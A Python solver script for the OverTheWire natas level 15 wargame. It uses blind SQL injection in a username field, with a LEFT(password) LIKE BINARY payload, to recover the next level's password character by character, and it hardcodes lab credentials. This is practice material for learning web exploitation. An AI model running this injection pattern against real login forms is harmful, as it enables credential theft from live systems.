"""
Help script to resolve natas challenge #15
"""
import requests
url = 'http://natas15.natas.labs.overthewire.org/index.php'
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
seen = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhm'

# We know the pass is 32 character long. The LEFT() operator takes the amount of characters, therefore start with 1.
for iteration in range(len(seen) + 1, 33):
    # Guess if the password string starts with the seen string.
    for symbol in charset:
        # Request
        response = requests.post(url,
                                 data={'username': 'natas16" and LEFT(password,{}) LIKE BINARY "%{}%'.format(iteration, seen + symbol)},
                                 auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if "This user exists." in response.text:
            seen += symbol
            print(iteration, seen)
print("The password should be: {}".format(seen))
